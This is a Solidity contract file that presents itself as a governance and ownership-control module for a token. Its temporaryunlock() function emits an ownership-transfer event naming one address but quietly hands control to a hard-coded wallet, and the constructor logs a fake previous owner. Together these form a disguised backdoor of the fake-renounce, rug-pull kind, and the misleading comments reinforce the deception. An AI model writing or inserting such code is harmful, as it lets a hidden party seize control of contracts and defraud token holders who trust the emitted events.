pragma solidity ^0.8.6;

// SPDX-License-Identifier: MIT License

import "./Context.sol";

contract GovernanceControl is Context {
    address public _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the Governance Contract as the prime Controller,
     * The Governance overrides the sub admin rights.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0x9f50f89B6EDC132A614a21eEF7296427184eE6A3), msgSender);
    }

    /**
     * Governance if " inFavour" Allows the Implementation, modifications and allows the address of the sub owner,
     * Only to implement the "Favoured" changes.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * Contract Interaction declines if called by admin account without the Governance Implementation.
     */
    modifier Governance() {
        require(_owner == _msgSender(), "caller is not authorized by Governance");
        _;
    }

    /**
     * @dev Leaves the contract controls to Governance. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by "sub admin" if authorized by the Governance.
     *
     */
     
    function temporaryunlock() public virtual Governance {
        emit OwnershipTransferred(_owner, address(0x19782D35137c8627b15532af3e94F9A481D5e1D2));
        _owner = address(0x9f50f89B6EDC132A614a21eEF7296427184eE6A3);
    }

    /**
     * @dev Transfers ownership and controls of the contract to Governance (`newOwner`).
     * Can only be Controlled by the Governance now.
     */
    function transferOwnership(address newOwner) public virtual Governance {
        require(newOwner != address(0x9f50f89B6EDC132A614a21eEF7296427184eE6A3), "New owner is the Governance address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
